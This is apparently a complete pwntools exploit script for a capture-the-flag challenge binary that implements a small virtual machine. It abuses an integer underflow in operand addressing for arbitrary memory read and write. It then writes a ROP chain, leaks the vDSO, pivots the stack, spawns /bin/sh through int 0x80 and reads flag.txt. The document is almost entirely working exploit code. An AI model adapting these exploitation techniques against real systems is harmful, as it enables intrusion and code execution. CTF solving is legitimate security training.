#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 6009 ./chal
from __future__ import annotations
import re
from pwn import *
from typing import NamedTuple

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.polygl0ts.ch'
docker_id = args.DOCKER
port = int(args.PORT or 6009)

context.terminal = ["tmux", "split", "-h"]


def debug(io, do_pause=False):
    if args.LOCAL:
        gdb.attach(io.pid, exe=exe.path, gdbscript=gdbscript)
    elif args.DOCKER:
        import docker
        procs = docker.from_env().containers.get(
            args.DOCKER).top()["Processes"]

        nspid = procs[0][1]
        elf_pid = procs[-1][1]  # TODO: find better way

        with tempfile.NamedTemporaryFile(prefix='pwnlib-gdbscript-', suffix='.gdb',
                                         delete=False, mode='w+') as tmp:
            tmp.write(gdbscript)
        cmd = ["nsenter", "-U", "-t", nspid, "-n"]
        cmd += ["gdb", "-pid", elf_pid, "-x", tmp.name]
        dbg = util.misc.run_in_new_terminal(cmd)
        sleep(1)
    if do_pause:
        pause()


def start_local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    return connect(host, port)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
gef config libc.assume_version (2,39)
file {exe.path}
#break *die
continue
'''.format(**locals())


def prompt(m, **kwargs):
    r = kwargs.pop("io", io)
    prefix = kwargs.pop("prefix", prompt_prefix)
    line = kwargs.pop("line", True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix, m, **kwargs)
        else:
            r.sendafter(prefix, m, **kwargs)
    else:
        if line:
            r.sendline(m, **kwargs)
        else:
            r.send(m, **kwargs)


def prompti(i, **kwargs):
    prompt(f"{i}".encode(), **kwargs)


def cmd(i, **kwargs):
    prefix = kwargs.pop("prefix", cmd_prefix)
    prompti(i, prefix=prefix, **kwargs)


def upk(m, **kwargs):
    return unpack(m, "all", **kwargs)


def printx(**kwargs):
    for k, v in kwargs.items():
        log.critical(f"{k}: {v:#x}")


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
IMM = 0
REG = 1
MEM = 2

ADD = 0
SUB = 1
MUL = 2
MOV = 3
BRK = 4
OUT = 5


class Operand(NamedTuple):
    tpe: int
    value: int

    def pack(self):
        try:
            return flat([self.tpe, self.value])
        except ValueError:
            return flat([self.tpe, self.value], sign=True)

    @staticmethod
    def imm(v: int) -> Operand:
        return Operand(IMM, v)

    @staticmethod
    def reg(v: int) -> Operand:
        return Operand(REG, v)

    @staticmethod
    def mem(v: int) -> Operand:
        return Operand(MEM, v)


class Ins(NamedTuple):
    op: int
    a: Operand
    b: Operand

    def pack(self):
        return p32(self.op) + self.a.pack() + self.b.pack()


prompt_prefix = b"> "
cmd_prefix = b"> "

# gadgets
pop_edx_ebx_esi = 0x188ee  # : pop edx ; pop ebx ; pop esi ; ret ; (1 found)
pop_ecx = 0x168e9  # : pop ecx ; add al, 0xF6 ; ret ; (1 found)
pop_eax = 0x71f9a
# : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret ; (1 found)
pivot_gadget = 0x75c77


# VULN: integer underflow in get_operand_addr, allowing for arb read/write

# step 1: code exec, retrieve vdso
vdso = None
io = None


def exploit():
    global vdso
    global io

    io = start()
    if vdso and not args.LOCAL and args.GDB:
        debug(io)

    data_ptr_idx = 0xfffffff4
    stack_ptr_idx = 0xfffff1ec

    def arbr_reg():
        pass

    def arbw_rel_rel(off_addr, off_value_ptr, off_value_rem):
        prog = b""
        if off_value_ptr is not None:
            prog += Ins(MOV, Operand.reg(0), Operand.mem(off_value_ptr)).pack()
            prog += Ins(ADD, Operand.reg(0), Operand.imm(off_value_rem)).pack()
        else:
            prog += Ins(MOV, Operand.reg(0), Operand.imm(off_value_rem)).pack()
        prog += Ins(MOV, Operand.mem(off_addr), Operand.reg(0)).pack()
        return prog

    prog = b""

    off_pie = 0xfffffba8
    off_pie_base = exe.sym._init
    off_rc = 0xfffffc00
    off_ra = 0xffffff68

    STK_REG = 0xff
    RC_REG = 0xfe

    # init data pointer
    prog += Ins(BRK, Operand.imm(3), Operand.imm(0)).pack()
    if not vdso:
        # rc to leak vdso
        rc = [
            (off_pie, exe.sym.die - off_pie_base),
            (None, 0x0),
            (off_pie, exe.address - off_pie_base - 0x2000),
            (None, 0x2000)
        ]
    else:
        # TODO:
        #
        int_80s = [m.start() for m in re.finditer(asm("int 0x80"), vdso)]
        # pop_edx_ebx_esi
        # pop_ecx = 0x168
        # pop_eax = 0x71f
        print(int_80s)
        for i in int_80s:
            printx(int_0x80=i)
        rc = [
            (off_pie, pop_edx_ebx_esi - off_pie_base),
            (None, 0),
            (off_pie, next(exe.search("/bin/sh\0")) - off_pie_base),
            (None, 0),
            (off_pie, pop_ecx - off_pie_base),
            (None, 0),
            (off_pie, pop_eax - off_pie_base),
            (None, 0xb),
            (off_pie, int_80s[1] - 0x2000 - off_pie_base),
        ]
    # setup rc in proper heap location
    for i, (o_v, r_v) in enumerate(rc):
        prog += arbw_rel_rel(off_rc+4*i, o_v, r_v)

    # pivot data to stack, keep ref to stack in STK_REG
    prog += Ins(MOV, Operand.reg(STK_REG), Operand.mem(stack_ptr_idx)).pack()
    prog += Ins(MOV, Operand.mem(data_ptr_idx),
                Operand.mem(stack_ptr_idx)).pack()
    off_pie = 0x178
    off_pie_base = exe.sym._start

    # setup rc pointer in regs and data
    prog += Ins(MOV, Operand.reg(RC_REG), Operand.reg(STK_REG)).pack()
    prog += Ins(ADD, Operand.reg(RC_REG), Operand.imm(off_rc)).pack()
    # prog += Ins(MOV, Operand.mem(off_rc-4), Operand.imm(0x1337beef)).pack()

    # overwrite ra with pop esp gadget to stack pivot
    prog += arbw_rel_rel(off_ra, off_pie, pivot_gadget-off_pie_base)

    prompt(prog)

    if not vdso:
        vdso = io.recvall()
    else:
        sleep(0.1)
        io.sendline("cat flag.txt")
        log.critical(io.recvline())


exploit()
exploit()
